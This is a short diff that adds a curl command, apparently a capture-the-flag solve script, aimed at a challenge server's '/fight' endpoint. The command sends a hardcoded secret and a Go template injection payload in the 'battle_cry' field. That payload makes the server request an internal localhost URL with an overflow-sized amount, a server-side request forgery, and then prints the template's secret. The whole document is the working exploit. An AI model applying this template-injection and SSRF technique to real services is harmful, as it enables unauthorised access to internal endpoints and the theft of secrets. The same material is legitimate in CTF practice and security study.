@@ -1,0 +1,3 @@
+curl -X POST http://challenges.1pc.tf:23290/fight \
+     -d "secret=Morty_Is_The_Real_One" \
+     -d 'battle_cry={{ $kill := .Rick.Scout "http://localhost:8080/internal/offer-runes?amount=4294967296" }}{{ .Secret }}'
